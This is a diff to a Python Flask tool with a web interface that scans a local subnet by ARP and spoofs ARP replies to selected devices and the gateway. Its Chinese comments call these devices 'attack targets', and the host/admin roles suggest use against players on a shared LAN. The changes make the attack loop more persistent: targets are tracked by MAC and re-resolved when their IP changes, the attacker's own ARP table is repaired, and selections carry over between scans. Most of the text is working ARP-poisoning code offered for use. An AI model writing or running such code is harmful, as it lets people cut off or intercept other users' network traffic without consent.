@@ -5,7 +5,6 @@ import time
 import ctypes
 import sys
 import webbrowser
-import socket
 
 from flask import Flask, render_template, request, jsonify
 from scapy.all import ARP, Ether, srp, sendp, conf, get_if_addr, get_if_list, get_if_hwaddr
@@ -27,19 +26,20 @@ app = Flask(__name__,
             static_folder=resource_path("static"))
 
 state = {
-        "is_running": False,
-        "targets": [],
-        "gateway_ip": "",
-        "gateway_mac": None,
-        "local_ip": "127.0.0.1",
-        "whitelist": [],
-        "bidirectional": True,
-        "packet_count": 0,
-        "iface_name": "",
-        "iface": None,             # 当前使用的网卡名称
-        "interval": 2.0,
-        "last_scan_clients": [],   # 保存最后一次扫描的玩家列表，供前端同步
-        "available_ifaces": []     # 可用网卡列表
+    "is_running": False,
+    "targets": [],               # [{mac, ip}, ...] 实际攻击对象，按 MAC 追踪
+    "gateway_ip": "",
+    "gateway_mac": None,
+    "local_ip": "127.0.0.1",
+    "whitelist": [],
+    "bidirectional": True,
+    "packet_count": 0,
+    "iface_name": "",
+    "iface": None,
+    "interval": 2.0,
+    "last_scan_clients": [],     # 最后一次扫描结果 (供前端同步)
+    "previously_checked": [],    # 上次扫描勾选的 MAC 列表
+    "available_ifaces": []
 }
 
 def run_as_admin():
@@ -51,12 +51,19 @@ def run_as_admin():
     except:
         pass
 
-def clear_arp_cache():
-    """每次发包前清空本机 ARP 缓存，防止缓存干扰伪造的 ARP 条目"""
-    try:
-        subprocess.run(["arp", "-d", "*"], capture_output=True, shell=True)
-    except:
-        pass
+# def clear_arp_cache():
+#     """每次发包前清空本机 ARP 缓存，防止缓存干扰伪造的 ARP 条目"""
+#     try:
+#         subprocess.run(["arp", "-d", "*"], capture_output=True, shell=True)
+#     except:
+#         pass
+
+def repair_own_arp(gw_ip, gw_mac):
+    """修复本机 ARP 表，防止自身被污染"""
+    if not gw_mac:
+        return
+    mac_formatted = gw_mac.replace(":", "-").upper()
+    subprocess.run(["arp", "-s", gw_ip, mac_formatted], capture_output=True)
 
 def get_available_ifaces():
     """获取系统中所有可用网卡列表"""
@@ -112,76 +119,67 @@ def auto_select_best_iface(ifaces):
             return iface
     return ifaces[0] if ifaces else {"name": str(conf.iface), "ip": "0.0.0.0", "mac": "00:00:00:00:00:00"}
 
-def get_local_ip_fallback():
-    """获取本机 IP，多种方法兜底"""
-    try:
-        ip = get_if_addr(conf.iface)
-        if ip and ip != "0.0.0.0":
-            return ip
-    except:
-        pass
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.settimeout(1)
-        s.connect(("8.8.8.8", 80))
-        ip = s.getsockname()[0]
-        s.close()
-        if ip and ip != "0.0.0.0":
-            return ip
-    except:
-        pass
-    try:
-        gw = conf.route.route("0.0.0.0")
-        if gw and len(gw) > 1:
-            ip = gw[1]
-            if ip and ip != "0.0.0.0":
-                return ip
-    except:
-        pass
-    return "127.0.0.1"
-
 def init_network():
     try:
-        # 获取所有可用网卡
         ifaces = get_available_ifaces()
         state["available_ifaces"] = ifaces
-        # 自动选择最佳网卡
         best = auto_select_best_iface(ifaces)
         state["local_ip"] = best["ip"]
         state["iface_name"] = best["name"]
-        state["iface"] = best["name"]  # 保存网卡名称供后续 srp/sendp 使用
-        # 检测网关
+        state["iface"] = best["name"]
         gw = conf.route.route("0.0.0.0")[2]
         if gw and gw != "0.0.0.0":
             state["gateway_ip"] = gw
-            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gw), timeout=3, verbose=False, retry=2)
-            if ans: state["gateway_mac"] = ans[0][1].hwsrc
+            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gw), timeout=2, verbose=False, retry=1)
+            if ans:
+                state["gateway_mac"] = ans[0][1].hwsrc
     except:
         pass
 
 def attack_loop():
     iface = state.get("iface")
+    count = 0
+    loop = 0
+
+    # 从 targets 恢复 MAC→IP 映射
+    mac_to_ip = {}
+    for t in state["targets"]:
+        mac_to_ip[t["mac"]] = t["ip"]
+
     while state["is_running"]:
         try:
-            # 每次发包前清空本机 ARP 缓存，确保伪造的 ARP 条目不被系统缓存覆盖
-            clear_arp_cache()
+            # 每 5 轮刷新目标 IP + 修复本机 ARP
+            if loop % 5 == 0:
+                network = ".".join(state["local_ip"].split('.')[:-1]) + ".0/24"
+                ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network),
+                             timeout=1, iface=iface, verbose=False, retry=0)
+                refreshed = {}
+                for _, rcv in ans:
+                    if rcv.hwsrc in mac_to_ip:
+                        refreshed[rcv.hwsrc] = rcv.psrc
+                for mac, new_ip in refreshed.items():
+                    if new_ip != mac_to_ip.get(mac):
+                        mac_to_ip[mac] = new_ip
+                if state["gateway_mac"]:
+                    repair_own_arp(state["gateway_ip"], state["gateway_mac"])
 
             current_wl = state["whitelist"] + [state["gateway_ip"], state["local_ip"]]
-            for target in state["targets"]:
-                if target['ip'] in current_wl:
+            for mac, current_ip in list(mac_to_ip.items()):
+                if current_ip in current_wl:
                     continue
-                p1 = Ether(dst=target['mac']) / ARP(op=2, pdst=target['ip'], hwdst=target['mac'],
-                                                    psrc=state["gateway_ip"])
+                p1 = Ether(dst=mac) / ARP(op=2, pdst=current_ip, hwdst=mac, psrc=state["gateway_ip"])
                 sendp(p1, iface=iface, verbose=False)
                 if state["bidirectional"] and state["gateway_mac"]:
                     p2 = Ether(dst=state["gateway_mac"]) / ARP(op=2, pdst=state["gateway_ip"],
-                                                               hwdst=state["gateway_mac"], psrc=target['ip'])
+                                                               hwdst=state["gateway_mac"], psrc=current_ip)
                     sendp(p2, iface=iface, verbose=False)
-                state["packet_count"] += (2 if state["bidirectional"] else 1)
+                count += (2 if state["bidirectional"] else 1)
+
+            state["packet_count"] = count
+            loop += 1
             time.sleep(state["interval"])
         except Exception:
             break
-    # 循环退出时确保状态同步
     state["is_running"] = False
 
 @app.route('/api/quit', methods=['POST'])
@@ -200,7 +198,6 @@ def scan():
     state["whitelist"] = request.json.get('whitelist', [])
     wl_ips = state["whitelist"] + [state["gateway_ip"], state["local_ip"]]
 
-    # 如果网关为空，用本机 IP 推断
     gw_ip = state["gateway_ip"]
     if not gw_ip or gw_ip == "0.0.0.0":
         if state["local_ip"] and state["local_ip"] != "127.0.0.1":
@@ -210,26 +207,32 @@ def scan():
             return jsonify([])
 
     network = ".".join(gw_ip.split('.')[:-1]) + ".0/24"
-
-    # 获取当前使用的网卡
     iface = state.get("iface")
 
-    # 先扫描网关
-    ans_gw, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gw_ip),
-                    timeout=3, verbose=False, retry=2, iface=iface)
-    if ans_gw:
-        state["gateway_mac"] = ans_gw[0][1].hwsrc
-
-    # 扫描整个网段 - 增加超时和重试
+    # 快速扫描 — 一次完成，从结果中提取网关 MAC
     ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network),
-                 timeout=5, verbose=False, retry=3, iface=iface)
+                 timeout=2, verbose=False, retry=1, iface=iface)
 
-    # 如果没扫到任何设备，尝试用本机 IP 所在网段再扫一次（手机热点场景）
     if len(ans) == 0 and state["local_ip"] != "127.0.0.1":
         alt_network = ".".join(state["local_ip"].split('.')[:-1]) + ".0/24"
         if alt_network != network:
             ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=alt_network),
-                         timeout=5, verbose=False, retry=3, iface=iface)
+                         timeout=2, verbose=False, retry=1, iface=iface)
+
+    # 从扫描结果提取网关 MAC
+    gw_mac = None
+    for _, rcv in ans:
+        if rcv.psrc == gw_ip:
+            gw_mac = rcv.hwsrc
+            break
+    if not gw_mac:
+        ans_gw, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gw_ip),
+                        timeout=2, verbose=False, retry=1, iface=iface)
+        gw_mac = ans_gw[0][1].hwsrc if ans_gw else None
+    state["gateway_mac"] = gw_mac
+
+    # 保存之前勾选的 MAC 列表
+    previously_checked = state.get("previously_checked", [])
 
     clients = []
     found_ips = set()
@@ -238,20 +241,25 @@ def scan():
         if ip in found_ips:
             continue
         found_ips.add(ip)
-        is_safe = ip in wl_ips or (state["gateway_mac"] and mac == state["gateway_mac"]) or ip == state["local_ip"]
+        is_safe = ip in wl_ips or (gw_mac and mac == gw_mac) or ip == state["local_ip"]
+        was_checked = mac in previously_checked and not is_safe
         role = ""
         if ip == state["local_ip"]:
             role = "管理"
-        elif ip == state["gateway_ip"]:
+        elif ip == gw_ip:
             role = "房主"
         clients.append({
             "ip": ip,
             "mac": mac.upper(),
             "role": role,
-            "is_safe": is_safe
+            "is_safe": is_safe,
+            "checked": was_checked
         })
-    # 保存扫描结果，供前端实时同步
+
     state["last_scan_clients"] = clients
+    # 更新 previously_checked：清除不在本次结果中的过时 MAC
+    current_macs = {c["mac"].lower() for c in clients}
+    state["previously_checked"] = [m for m in previously_checked if m.lower() in current_macs]
     return jsonify(clients)
 
 @app.route('/api/update_whitelist', methods=['POST'])
@@ -261,7 +269,11 @@ def update_whitelist():
 
 @app.route('/api/update_targets', methods=['POST'])
 def update_targets():
-    state["targets"] = request.json.get('targets', [])
+    """按 MAC 更新 targets（客户端传 {mac, ip, checked}）"""
+    new_targets = request.json.get('targets', [])
+    state["targets"] = [{"mac": t["mac"], "ip": t["ip"]} for t in new_targets if t.get("checked")]
+    # 保存当前勾选的 MAC 列表（用于下次扫描恢复）
+    state["previously_checked"] = [t["mac"] for t in new_targets if t.get("checked")]
     return jsonify({"status": "targets updated"})
 
 @app.route('/api/update_config', methods=['POST'])
@@ -270,21 +282,29 @@ def update_config():
     if 'bidirectional' in data:
         state["bidirectional"] = data['bidirectional']
     if 'interval' in data:
-        new_interval = float(data['interval'])
-        if 0.1 <= new_interval <= 999.0:
-            state["interval"] = new_interval
+        try:
+            new_interval = float(data['interval'])
+            if 0.1 <= new_interval <= 999.0:
+                state["interval"] = new_interval
+        except ValueError:
+            pass
     return jsonify({"status": "config updated"})
 
 @app.route('/api/control', methods=['POST'])
 def control():
     data = request.json
     if data['action'] == "start":
-        state["targets"] = data['targets']
+        # 按 MAC 保存 targets
+        raw_targets = data.get('targets', [])
+        state["targets"] = [{"mac": t["mac"], "ip": t["ip"]} for t in raw_targets if t.get("checked")]
         state["bidirectional"] = data['bidirectional']
         state["whitelist"] = data['whitelist']
         if 'interval' in data:
-            state["interval"] = float(data['interval'])
-        if not state["is_running"]:
+            try:
+                state["interval"] = float(data['interval'])
+            except ValueError:
+                pass
+        if not state["is_running"] and state["targets"]:
             state["is_running"] = True
             state["packet_count"] = 0
             threading.Thread(target=attack_loop, daemon=True).start()
@@ -299,13 +319,10 @@ def handle_openlock():
 
 @app.route('/api/status')
 def get_status():
-    """返回运行时状态（包计数、运行标志）"""
     return jsonify({"count": state["packet_count"], "running": state["is_running"]})
 
 @app.route('/api/state')
 def get_full_state():
-    """返回全量状态，供前端页面刷新后恢复勾选、列表、配置等"""
-    # 将 targets IP 转为 set 方便前端判断哪些 IP 被选中
     target_ips = [t["ip"] for t in state["targets"]]
     return jsonify({
         "running": state["is_running"],
